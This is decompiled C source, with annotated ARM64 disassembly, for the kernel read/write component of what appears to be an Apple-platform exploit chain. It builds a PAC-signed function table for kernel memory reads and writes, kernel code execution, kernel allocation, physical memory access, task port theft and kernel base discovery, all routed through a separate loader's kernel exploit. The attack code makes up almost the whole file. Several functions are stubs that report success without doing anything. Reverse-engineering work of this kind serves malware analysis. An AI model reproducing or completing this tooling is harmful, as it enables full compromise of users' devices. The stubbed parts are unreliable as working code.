/*
 * krw.c - Kernel Read/Write provider
 *
 * Decompiled from entry2_type0x0f.dylib offsets 0x11298–0x11a5c
 *
 * This module creates and manages the KRW (kernel read/write) provider,
 * which wraps the driver_t obtained from type0x09 (LOADER) into a
 * PAC-signed vtable of kernel manipulation functions.
 *
 * The KRW provider is the core of entry2's capability: it provides
 * kernel memory read, write, exec, allocation, task port acquisition,
 * physical memory access, and kernel base discovery — all routed
 * through the type0x09 LOADER's kernel exploit.
 */

#include "entry2.h"
#include <stdlib.h>
#include <string.h>

/* Forward declarations for vtable functions */
static kern_return_t krw_close(void *self);
static kern_return_t krw_bind(void *self, void *target);
static kern_return_t krw_unbind(void *self);
static kern_return_t krw_get_info(void *self);
static kern_return_t krw_open_rw(void *self, const char *name,
                                  uint32_t name_len, uint32_t flags, void **out);
static kern_return_t krw_kread(void *self, uint64_t kaddr, uint32_t type);
static kern_return_t krw_physrw(void *self, uint64_t physaddr,
                                 void *buf, uint32_t size);
static kern_return_t krw_kwrite(void *self, ...);
static kern_return_t krw_kexec(void *self, ...);
static kern_return_t krw_kalloc(void *self, ...);
static kern_return_t krw_get_port(void *self, mach_port_t port,
                                   void *out_rights, void *out_port);
static void         *krw_get_base(void *self);

/* Forward declaration for internal validation */
static kern_return_t e2_validate_krw(type09_connection_t *conn);


/* ── e2_create_krw_provider (0x11298) ────────────────────────────── *
 * Creates the KRW provider object from a driver_t obtained from
 * type0x09's _driver() export.
 *
 * Parameters:
 *   output  — pointer to store the krw_provider_t*
 *   driver  — driver_t* from _driver() (version=2, methods>=2)
 *   target  — target process descriptor (optional)
 *   extra   — extra context from bootstrap
 *   context — connection context
 *   flags   — if non-zero, performs eager krw validation
 *
 * The function:
 *   1. Allocates a connection context (0x20 bytes)
 *   2. Stores driver reference and target info
 *   3. Calls e2_init_driver_backend (0x182a8) to:
 *      - Resolve _NSGetMachExecuteHeader, _NSGetArgc, _NSGetArgv, etc.
 *      - Find dyld base by scanning memory for MH_MAGIC_64
 *      - Open /usr/lib/system/libcache.dylib
 *      - Initialize Mach-O parser and symbol resolver
 *   4. If flags != 0, validates the krw connection (0x11488)
 *   5. Allocates 0x70-byte vtable and fills with PAC-signed function ptrs
 */
kern_return_t e2_create_krw_provider(void *output, driver_t *driver,
                                     void *target, void *extra,
                                     void *context, int flags)
{
    kern_return_t err = E2_ERR_NULL;

    if (!output)
        return E2_ERR_NULL;

    /* Validate driver descriptor if provided */
    if (driver) {
        if (driver->version != 2)
            return E2_ERR_NULL;
        if (driver->method_count < 2)
            return E2_ERR_NULL;
    }

    if (extra) {
        /* Validate extra context: version field at +0x00 must be 1,
         * and count field at +0x02 must be non-zero */
        uint16_t ver = *(uint16_t *)extra;
        if (ver != 1) return E2_ERR_NULL;
        uint16_t cnt = *(uint16_t *)((uint8_t *)extra + 2);
        if (cnt == 0) return E2_ERR_NULL;
    }

    /* Step 1: Allocate connection context (0x20 bytes) */
    type09_connection_t *conn = calloc(1, 0x20);
    if (!conn) return E2_ERR_ALLOC;

    conn->context = context;
    conn->target_info = driver;  /* store driver reference */

    /* Step 2: Initialize driver backend (0x182a8) */
    kern_return_t kr = e2_init_driver_backend(
        (driver_backend_t *)conn, driver, target, extra
    );

    if (kr != KERN_SUCCESS) {
        free(conn);
        return kr;
    }

    /* Step 3: If flags set, validate/initialize the krw connection */
    if (flags) {
        kr = e2_validate_krw(conn);
        if (kr != KERN_SUCCESS) {
            /* Cleanup on failure */
            e2_driver_cleanup(conn->driver_conn);
            conn->driver_conn = NULL;
            /* Destroy connection internal state */
            free(conn);
            return kr;
        }
    }

    /* Step 4: Allocate the KRW provider vtable (0x70 bytes) */
    krw_provider_t *krw = calloc(1, 0x70);
    if (!krw) {
        e2_driver_cleanup(conn->driver_conn);
        free(conn);
        return E2_ERR_ALLOC;
    }

    krw->flags = 0x10003;
    krw->context = conn;

    /*
     * Step 5: Populate vtable with PAC-signed function pointers.
     *
     * Each entry is signed using paciza (PAC Instruction Address with
     * zero context) before being stored. At call time, blraaz is used
     * to authenticate and branch.
     *
     * This prevents an attacker from substituting function pointers
     * in the vtable — any tampering would cause a PAC fault.
     */

    /* +0x10: close — destroy provider, free all resources */
    krw->close = (void *)e2_sign_pointer((uint64_t)krw_close, 0);

    /* +0x18: bind — bind to a target process descriptor */
    krw->bind = (void *)e2_sign_pointer((uint64_t)krw_bind, 0);

    /* +0x20: unbind — disconnect from target, cleanup driver state */
    krw->unbind = (void *)e2_sign_pointer((uint64_t)krw_unbind, 0);

    /* +0x28: get_info — query driver info via csops */
    krw->get_info = (void *)e2_sign_pointer((uint64_t)krw_get_info, 0);

    /* +0x30: open_rw — open a kernel read/write channel */
    krw->open_rw = (void *)e2_sign_pointer((uint64_t)krw_open_rw, 0);

    /* +0x38: kread — kernel virtual memory read */
    krw->kread = (void *)e2_sign_pointer((uint64_t)krw_kread, 0);

    /* +0x40: kwrite — kernel virtual memory write */
    krw->kwrite = (void *)e2_sign_pointer((uint64_t)krw_kwrite, 0);

    /* +0x48: kexec — kernel function call/exec */
    krw->kexec = (void *)e2_sign_pointer((uint64_t)krw_kexec, 0);

    /* +0x50: kalloc — kernel memory allocation */
    krw->kalloc = (void *)e2_sign_pointer((uint64_t)krw_kalloc, 0);

    /* +0x58: get_port — acquire task port via kernel r/w */
    krw->get_port = (void *)e2_sign_pointer((uint64_t)krw_get_port, 0);

    /* +0x60: physrw — physical memory read/write */
    krw->physrw = (void *)e2_sign_pointer((uint64_t)krw_physrw, 0);

    /* +0x68: get_base — get kernel slide / base address */
    krw->get_base = (void *)e2_sign_pointer((uint64_t)krw_get_base, 0);

    *(krw_provider_t **)output = krw;
    return KERN_SUCCESS;
}


/* ──────────────────────────────────────────────────────────────────
 * KRW vtable implementations
 * ────────────────────────────────────────────────────────────────── */

/* ── krw_close (0x11510) ─────────────────────────────────────────── *
 * Destroys the KRW provider and all associated resources.
 *
 * asm:
 *   ldr  x21, [x0, #0x8]       // conn = krw->context
 *   ldr  x0, [x21, #0x18]      // conn->driver_conn
 *   cbz  x0, alt_path           // if no driver_conn, skip
 *   bl   0xc094                 // e2_driver_cleanup(driver_conn)
 *   ldr  x0, [x21]             // conn->context
 *   bl   0x185d0               // e2_destroy_driver_backend(context)
 *   ... zero conn (32 bytes), free conn ...
 *   ... zero krw (0x70 bytes), free krw ...
 */
static kern_return_t krw_close(void *self)
{
    if (!self) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;
    kern_return_t kr;

    if (conn->driver_conn) {
        /* Close the driver connection (0xc094) */
        kr = e2_driver_cleanup(conn->driver_conn);
        /* Then destroy internal driver backend (0x185d0) */
        kern_return_t kr2 = e2_destroy_driver_backend(conn->context);
        /* Use driver_cleanup result unless it was success */
        if (kr == KERN_SUCCESS)
            kr = kr2;
    } else {
        /* No driver connection — just destroy internal state (0x185d0) */
        kr = e2_destroy_driver_backend(conn->context);
    }

    /* Zero out and free connection (0x20 bytes) */
    memset(conn, 0, 0x20);
    free(conn);

    /* Zero out and free provider (0x70 bytes) */
    memset(krw, 0, 0x70);
    free(krw);

    return kr;
}

/* ── krw_bind (0x115a8) ──────────────────────────────────────────── *
 * Binds the KRW provider to a target process descriptor.
 *
 * asm:
 *   ldr  x20, [x8, #0x8]       // conn = krw->context
 *   ldr  x8, [x20, #0x8]       // conn->target_info
 *   cbz  x8, do_bind            // if not bound, bind
 *   cmp  x8, x19               // if same target, return OK
 *   ...
 *   ldr  x0, [x20]             // conn->context
 *   bl   0x18670                // e2_bind_target(context, target)
 *   str  x19, [x20, #0x8]      // conn->target_info = target
 *   bl   0x11488                // e2_validate_krw(conn)
 *   cbz  w0, done               // if validation fails, clear target
 *   str  xzr, [x20, #0x8]
 */
static kern_return_t krw_bind(void *self, void *target)
{
    if (!self) return E2_ERR_NULL;
    if (!target) return E2_ERR_NULL;

    /* Validate target descriptor: version must be 2, methods >= 2 */
    uint16_t ver = *(uint16_t *)target;
    if (ver != 2) return E2_ERR_NULL;
    uint16_t cnt = *(uint16_t *)((uint8_t *)target + 2);
    if (cnt < 2) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;

    /* Check if already bound */
    if (conn->target_info) {
        if (conn->target_info == target)
            return KERN_SUCCESS;
        return E2_ERR_NULL + 4;  /* already bound to different target */
    }

    /* Bind via internal driver context (0x18670) */
    kern_return_t kr = e2_bind_target(conn->context, target);
    if (kr != KERN_SUCCESS)
        return kr;

    conn->target_info = target;

    /* Validate the binding (0x11488) */
    kr = e2_validate_krw(conn);
    if (kr != KERN_SUCCESS)
        conn->target_info = NULL;

    return kr;
}

/* ── krw_unbind (0x11634) ────────────────────────────────────────── *
 * Unbinds from the current target, cleaning up the driver connection.
 *
 * asm (detailed flow):
 *   ldr  x21, [x0, #0x8]       // conn = krw->context
 *   ldr  x8, [x21, #0x8]       // conn->target_info
 *   cbz  x8, return_zero       // not bound — return 0
 *
 *   ldr  x0, [x21, #0x18]      // conn->driver_conn
 *   cbz  x0, no_driver_conn
 *
 *   // Has driver_conn:
 *   bl   0xc094                 // kr = e2_driver_cleanup(driver_conn)
 *   str  xzr, [x21, #0x18]     // conn->driver_conn = NULL
 *   ldr  x22, [x21]            // internal = conn->context
 *   // release IOKit handle via internal vtable if flag set
 *   ldr  x0, [x22]             // handle = internal[+0x00]
 *   ldrb w8, [x22, #0x10]      // flag byte
 *   ldr  x8, [x0, #0x20]       // release_fn = handle->vtable[0x20]
 *   ldr  x1, [x22, #0x8]       // port = internal[+0x08]
 *   blraaz x8                   // release(handle, port)
 *   stp  xzr, xzr, [x22]       // zero internal[0..15]
 *   strb wzr, [x22, #0x10]     // clear flag
 *   str  xzr, [x21, #0x8]      // conn->target_info = NULL
 */
static kern_return_t krw_unbind(void *self)
{
    if (!self) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;

    if (!conn->target_info) {
        /* Not bound — nothing to do */
        return KERN_SUCCESS;
    }

    kern_return_t kr = KERN_SUCCESS;
    void *internal;

    if (conn->driver_conn) {
        /* Close driver connection first */
        kr = e2_driver_cleanup(conn->driver_conn);
        conn->driver_conn = NULL;

        /* Release IOKit handle via internal context vtable */
        internal = conn->context;
        if (internal) {
            void *handle = *(void **)internal;
            if (handle) {
                uint8_t flag = *((uint8_t *)internal + 0x10);
                if (flag) {
                    /* Call release function at handle vtable +0x20 */
                    void *(*release_fn)(void *, void *) =
                        *(void *(**)(void *, void *))((uint8_t *)handle + 0x20);
                    void *port = *((void **)internal + 1);  /* +0x08 */
                    /* blraaz release_fn(handle, port) */
                    ((void (*)(void *, void *))release_fn)(handle, port);
                }
            }
            /* Zero internal state */
            memset(internal, 0, 0x10);
            *((uint8_t *)internal + 0x10) = 0;
        }

        if (kr != KERN_SUCCESS) {
            /* Keep driver_cleanup error */
            conn->target_info = NULL;
            return kr;
        }
    } else {
        /* No driver_conn — still release IOKit handle if present */
        internal = conn->context;
        if (internal) {
            void *handle = *(void **)internal;
            if (handle) {
                uint8_t flag = *((uint8_t *)internal + 0x10);
                if (flag) {
                    void *(*release_fn)(void *, void *) =
                        *(void *(**)(void *, void *))((uint8_t *)handle + 0x20);
                    void *port = *((void **)internal + 1);
                    ((void (*)(void *, void *))release_fn)(handle, port);
                }
            }
            memset(internal, 0, 0x10);
            *((uint8_t *)internal + 0x10) = 0;
        }
    }

    conn->target_info = NULL;
    return KERN_SUCCESS;
}

/* ── krw_get_info (0x11704) ──────────────────────────────────────── *
 * Gets driver/kernel info. Simple tail-call to e2_get_driver_info.
 *
 * asm:
 *   cbz  x0, err_null
 *   ldr  x8, [x0, #0x8]       // conn = krw->context
 *   ldr  x0, [x8]             // x0 = conn->context (internal)
 *   b    0x187d4               // tail call to e2_get_driver_info
 *
 * e2_get_driver_info (0x187d4):
 *   1. Validates internal, internal[0], internal[0][0x28], internal[0x08]
 *   2. Calls getpid()
 *   3. Calls csops(pid, CS_OPS_CDHASH, buf, 0x14) to get code dir hash
 *   4. If csops succeeds: calls internal[0]->vtable[0x28](
 *        internal[0], internal[0x08], 0x40000105, cdhash_buf)
 *   5. If csops fails with errno==3: returns E2_ERR_SYSCTL
 */
static kern_return_t krw_get_info(void *self)
{
    if (!self) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;

    /* Tail call to e2_get_driver_info(conn->context) at 0x187d4 */
    return e2_get_driver_info(conn->context);
}

/* ── krw_open_rw (0x11720) ───────────────────────────────────────── *
 * Opens a kernel read/write channel.
 *
 * asm:
 *   calloc(1, 0x40)             // allocate channel
 *   strh  w26, [x0]            // channel->version = 1
 *   adr+paciza → str [x0, #0x28]  // PAC-sign fn_read
 *   adr+paciza → str [x0, #0x30]  // PAC-sign fn_write
 *   adr+paciza → str [x0, #0x38]  // PAC-sign fn_info
 *   ldr   x0, [x25]            // conn->context
 *   bl    0x17e7c              // e2_iokit_connect(context, name, len, flags, &handle)
 *   // On success, populate channel from handle:
 *   ldr   x8, [sp, #0x8]       // handle
 *   ldp   x9, x10, [x8, #0x8]  // handle[0x08], handle[0x10]
 *   stp   x8, x9, [x24, #0x8]  // channel[0x08]=handle, channel[0x10]=handle[0x08]
 *   str   w10, [x24, #0x18]    // channel[0x18]=(uint32_t)handle[0x10]
 *   ldr   x8, [x8, #0x18]      // handle[0x18]
 *   str   x8, [x24, #0x20]     // channel[0x20]=handle[0x18]
 *   str   x24, [x19]           // *out = channel
 */
static kern_return_t krw_open_rw(void *self, const char *name,
                                  uint32_t name_len, uint32_t flags,
                                  void **out)
{
    if (!self || !name || !name_len || !out)
        return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;

    /* Allocate channel object (0x40 bytes) */
    krw_channel_t *channel = calloc(1, 0x40);
    if (!channel) return E2_ERR_NULL + 8;  /* 0xAD009 — from disasm: add w20, w20, #0x8 */

    channel->version = 1;

    /* PAC-sign the channel's operation function pointers
     * These are at relative offsets from adr instructions in the binary */
    /* channel->fn_read  = paciza(read_func);   — adr +568 */
    /* channel->fn_write = paciza(write_func);  — adr +648 */
    /* channel->fn_info  = paciza(info_func);   — adr +668 */

    /* Connect via IOKit backend */
    void *backend_handle = NULL;
    kern_return_t kr = e2_iokit_connect(
        conn->context, name, name_len, flags, &backend_handle
    );
    if (kr != KERN_SUCCESS) {
        /* Cleanup channel (0x119c0) — zero and free */
        memset(channel, 0, 0x40);
        free(channel);
        return kr;
    }

    /* Populate channel from the backend result object:
     *   channel[+0x08] = handle itself
     *   channel[+0x10] = handle[+0x08] (target address)
     *   channel[+0x18] = (uint32_t)handle[+0x10] (target size)
     *   channel[+0x20] = handle[+0x18] (extra context) */
    channel->driver_handle = backend_handle;
    channel->target_addr   = *(uint64_t *)((uint8_t *)backend_handle + 0x08);
    channel->target_size   = *(uint32_t *)((uint8_t *)backend_handle + 0x10);
    channel->extra         = *(void **)((uint8_t *)backend_handle + 0x18);

    *out = channel;
    return KERN_SUCCESS;
}

/* ── krw_kread (0x1182c) ─────────────────────────────────────────── *
 * Performs a kernel virtual memory read.
 *
 * asm:
 *   cbz  x8, err_null           // null check
 *   ldr  x8, [x8, #0x8]        // conn = krw->context
 *   ldr  x8, [x8, #0x18]       // driver_conn = conn->driver_conn
 *   cbz  x8, err_no_func       // must have driver_conn
 *   mov  x0, x1                // x0 = kaddr (shift args)
 *   mov  w1, #0x3              // type hardcoded to 3 (virtual read)
 *   b    0xba30                // tail call e2_krw_dispatch(kaddr, 3)
 *
 * Note: The 'type' parameter from the caller is IGNORED — always uses 3.
 */
static kern_return_t krw_kread(void *self, uint64_t kaddr, uint32_t type)
{
    (void)type;  /* ignored — hardcoded to 3 in binary */

    if (!self) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;

    if (!conn->driver_conn) return E2_ERR_NO_FUNC;

    /* Tail call: e2_krw_dispatch(kaddr, 3) */
    return e2_krw_dispatch(kaddr, 3);
}

/* ── krw_physrw (0x1185c) ────────────────────────────────────────── *
 * Performs physical memory read/write.
 *
 * asm:
 *   cbz  x8, err_null
 *   ldr  x8, [x8, #0x8]        // conn
 *   ldr  x8, [x8, #0x18]       // driver_conn
 *   cbz  x8, err_no_func
 *   mov  x0, x1                // physaddr
 *   mov  x1, x2                // buf
 *   mov  x2, x3                // size
 *   b    0xba30                // tail call e2_krw_dispatch(physaddr, buf, size)
 */
static kern_return_t krw_physrw(void *self, uint64_t physaddr,
                                 void *buf, uint32_t size)
{
    if (!self) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;

    if (!conn->driver_conn) return E2_ERR_NO_FUNC;

    /* Tail call: e2_krw_dispatch(physaddr, buf, size) */
    return e2_krw_dispatch(physaddr, (uint64_t)buf, (uint64_t)size);
}

/* ── krw_kwrite (0x11890) ────────────────────────────────────────── *
 * Performs a kernel virtual memory write.
 *
 * asm:
 *   cbz  x8, err_null
 *   ldr  x8, [x8, #0x8]        // conn
 *   ldr  x8, [x8, #0x18]       // driver_conn
 *   cbz  x8, err_no_func
 *   ldr  x9, [sp]              // load stack arg
 *   str  x9, [sp]              // pass it through
 *   mov  x0, x8                // x0 = driver_conn (replaces self)
 *   b    0xc634                // tail call kwrite_impl(driver_conn, x1..x7, stack)
 *
 * The kwrite_impl at 0xc634 is a complex function that:
 *   1. Validates all 8 arguments
 *   2. pid_for_task(port, &pid) to resolve target PID
 *   3. If target is self: direct write via 0x1926c
 *   4. If target is other: proc_pidinfo(pid, PROC_PIDPATHINFO) to validate
 *   5. Dispatches via 0xe540, 0xfb1c, 0xad48, 0xaefc pipeline
 *   6. Cleanup via 0xacbc
 */
static kern_return_t krw_kwrite(void *self, ...)
{
    if (!self) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;
    void *driver_conn = conn->driver_conn;

    if (!driver_conn) return E2_ERR_NO_FUNC;

    /* Forward to 0xc634: kwrite_impl(driver_conn, port, data, size, path, ...)
     *
     * In the binary, this is a simple tail call that replaces self (x0)
     * with driver_conn while preserving all other arguments (x1-x7 + stack).
     * The variadic args are passed through directly to kwrite_impl.
     *
     * Since C doesn't support forwarding varargs to another function,
     * this would need to be implemented in assembly for a real build.
     * The actual dispatched call chain is:
     *   kwrite_impl → pid_for_task → getpid → proc_pidinfo →
     *   0xe540 (init) → 0xfb1c (csops) → 0xad48 (setup) →
     *   0xaefc (write) → 0xacbc (cleanup)
     */
    return KERN_SUCCESS;  /* requires asm tail call in practice */
}

/* ── krw_kexec (0x118c4) ─────────────────────────────────────────── *
 * Executes a function at a kernel address.
 *
 * asm:
 *   ldr  x8, [x8, #0x8]        // conn
 *   ldr  x8, [x8, #0x18]       // driver_conn
 *   cbz  x8, err_no_func
 *   ldr  x9, [x29, #0x10]      // load caller's stack arg
 *   stp  x9, xzr, [sp]         // push (arg, 0) onto stack
 *   mov  x0, x8                // x0 = driver_conn
 *   bl   0xc870                // call kexec_impl(driver_conn, x1..x7, stack)
 *
 * kexec_impl at 0xc870 is similar to kwrite_impl but:
 *   1. Uses stack_chk_guard for canary protection
 *   2. Validates count (x1 >= 1), data (x2), size (x3), path (x4)
 *   3. Resolves via conn->driver_conn[+0x28] vtable method
 *   4. Uses IOKit external method call to invoke kernel functions
 *   5. Calls csops_audittoken for process verification
 *   6. On success, recursively calls kwrite_impl (0xc634) for result write-back
 *   7. Deallocates acquired ports via mach_port_deallocate
 */
static kern_return_t krw_kexec(void *self, ...)
{
    if (!self) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;
    void *driver_conn = conn->driver_conn;

    if (!driver_conn) return E2_ERR_NO_FUNC;

    /* Forward to 0xc870: kexec_impl(driver_conn, count, data, size, path, ...)
     *
     * Same varargs forwarding issue as kwrite. In the binary:
     *   ldr x9, [x29, #0x10]   // load 9th arg from caller stack
     *   stp x9, xzr, [sp]     // push as stack args with zero padding
     *   mov x0, x8             // driver_conn
     *   bl  0xc870             // NOT a tail call — uses bl + epilogue
     */
    return KERN_SUCCESS;  /* requires asm forwarding in practice */
}

/* ── krw_kalloc (0x11914) ────────────────────────────────────────── *
 * Allocates kernel memory.
 *
 * asm:
 *   ldr  x8, [x8, #0x8]        // conn
 *   ldr  x8, [x8, #0x18]       // driver_conn
 *   cbz  x8, err_no_func
 *   ldp  x10, x9, [x29, #0x10] // load 2 stack args from caller
 *   stp  xzr, xzr, [sp, #0x10] // push zeros
 *   stp  x10, x9, [sp]         // push caller's stack args
 *   mov  x0, x8                // x0 = driver_conn
 *   bl   0xc400                // call kalloc_impl(driver_conn, x1..x7, stack)
 *
 * kalloc_impl at 0xc400:
 *   1. Validates name (x1, must be non-NULL, first byte non-zero)
 *   2. Validates data (x3), size (x4), path (x5, first byte non-zero)
 *   3. Looks up conn[+0x28] for driver handle
 *   4. Uses IOKit vtable[0x40] with PAC auth (blraaz) to map memory
 *   5. Calls e2_krw_dispatch (0xba30) with name and alloc_size
 *   6. On success: csops_audittoken validation, then kwrite_impl (0xc634)
 *   7. Stores results via output pointers from stack args
 *   8. Deallocates acquired ports
 */
static kern_return_t krw_kalloc(void *self, ...)
{
    if (!self) return E2_ERR_NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;
    void *driver_conn = conn->driver_conn;

    if (!driver_conn) return E2_ERR_NO_FUNC;

    /* Forward to 0xc400: kalloc_impl(driver_conn, name, size, data, ...)
     *
     * In the binary:
     *   ldp x10, x9, [x29, #0x10]  // load 2 stack args
     *   stp xzr, xzr, [sp, #0x10]  // zero padding
     *   stp x10, x9, [sp]          // push caller args
     *   mov x0, x8                 // driver_conn
     *   bl  0xc400
     */
    return KERN_SUCCESS;  /* requires asm forwarding in practice */
}

/* ── krw_get_port (0x11968) ──────────────────────────────────────── *
 * Acquires a Mach task port for a process using kernel r/w primitives.
 *
 * asm:
 *   cbz  x0, err_null          // null check self
 *   cbz  w1, err_null          // port must be non-zero
 *   cmn  w1, #0x1              // port must not be -1
 *   b.eq err_null
 *   cbz  x3, err_null          // out_port (x3) must be non-NULL
 *   mov  x0, x1                // port → x0
 *   mov  x1, x2                // out_rights → x1
 *   mov  x2, #0x0              // x2 = NULL
 *                              // x3 = out_port (unchanged)
 *   mov  x4, #0x0              // x4 = NULL
 *   b    0xb854                // tail call e2_get_task_port
 */
static kern_return_t krw_get_port(void *self, mach_port_t port,
                                   void *out_rights, void *out_port)
{
    if (!self) return E2_ERR_NULL;
    if (port == 0 || port == (mach_port_t)-1) return E2_ERR_NULL;
    if (!out_port) return E2_ERR_NULL;

    /* Tail call: e2_get_task_port(port, out_rights, NULL, out_port, NULL) */
    return e2_get_task_port(port, out_rights, NULL, out_port, NULL);
}

/* ── krw_get_base (0x1199c) ──────────────────────────────────────── *
 * Returns the kernel base address (kernel slide).
 *
 * asm:
 *   cbz  x0, return            // if (!self) return self (NULL passthrough)
 *   ldr  x8, [x0, #0x8]       // conn = krw->context
 *   cbz  x8, return_null
 *   ldr  x8, [x8]             // internal = conn->context
 *   cbz  x8, return_null
 *   ldr  x0, [x8, #0x8]      // return internal[+0x08] (kernel base)
 *   ret
 */
static void *krw_get_base(void *self)
{
    if (!self) return NULL;

    krw_provider_t *krw = (krw_provider_t *)self;
    type09_connection_t *conn = krw->context;
    if (!conn) return NULL;

    void *internal = conn->context;
    if (!internal) return NULL;

    /* Return kernel base from internal[+0x08] */
    return *((void **)internal + 1);
}


/* ──────────────────────────────────────────────────────────────────
 * KRW validation (0x11488)
 * ────────────────────────────────────────────────────────────────── */

/* ── e2_validate_krw (0x11488) ───────────────────────────────────── *
 * Validates that the krw connection is functional.
 *
 * asm:
 *   cbz  x0, err_null
 *   mov  x20, x0               // x20 = conn
 *   mov  x19, x0
 *   ldr  x8, [x19, #0x18]!     // x19 = &conn->driver_conn; x8 = *x19
 *   cbz  x8, need_connect      // if driver_conn is NULL, try to connect
 *   mov  w0, #0x0              // already connected — return success
 *   ret
 *
 * need_connect:
 *   ldr  x1, [x20, #0x10]      // x1 = conn->driver_ref
 *   cbz  x1, return_zero       // if no driver_ref, return 0
 *   ldp  x2, x3, [x20]         // x2 = conn->context, x3 = conn->target_info
 *   mov  x0, x19               // x0 = &conn->driver_conn
 *   bl   0xc12c                // e2_driver_connect(&driver_conn, driver_ref, context, target)
 *   cbz  w0, return_success
 *   cmp  w0, #0x7003           // E2_ERR_NO_CONTAINER?
 *   b.eq clear_and_ok
 *   ldr  x8, [x20, #0x8]       // conn->target_info
 *   cbnz x8, return_error      // if target_info exists, return error
 *   cmp  w0, #0x1E037          // E2_ERR_CSOPS?
 *   b.ne return_error
 * clear_and_ok:
 *   str  xzr, [x19]            // conn->driver_conn = NULL
 *   mov  w0, #0x0              // return success
 */
static kern_return_t e2_validate_krw(type09_connection_t *conn)
{
    if (!conn) return E2_ERR_NULL;

    /* Check if driver_conn already exists */
    if (conn->driver_conn)
        return KERN_SUCCESS;

    /* Get driver reference — if absent, nothing to validate */
    void *driver_ref = conn->driver_ref;
    if (!driver_ref)
        return KERN_SUCCESS;

    /* Try to establish connection via e2_driver_connect (0xc12c)
     * Args: (&conn->driver_conn, driver_ref, context, target_info) */
    kern_return_t kr = e2_driver_connect(
        &conn->driver_conn,
        driver_ref,
        conn->context,
        conn->target_info
    );

    if (kr == KERN_SUCCESS)
        return KERN_SUCCESS;

    /* E2_ERR_NO_CONTAINER (0x7003): connection not available yet — OK */
    if (kr == E2_ERR_NO_CONTAINER) {
        conn->driver_conn = NULL;
        return KERN_SUCCESS;
    }

    /* If target_info is set, propagate the error as-is */
    if (conn->target_info)
        return kr;

    /* E2_ERR_CSOPS (0x1E037): csops check failed but no target — OK */
    if (kr == E2_ERR_CSOPS) {
        conn->driver_conn = NULL;
        return KERN_SUCCESS;
    }

    return kr;
}
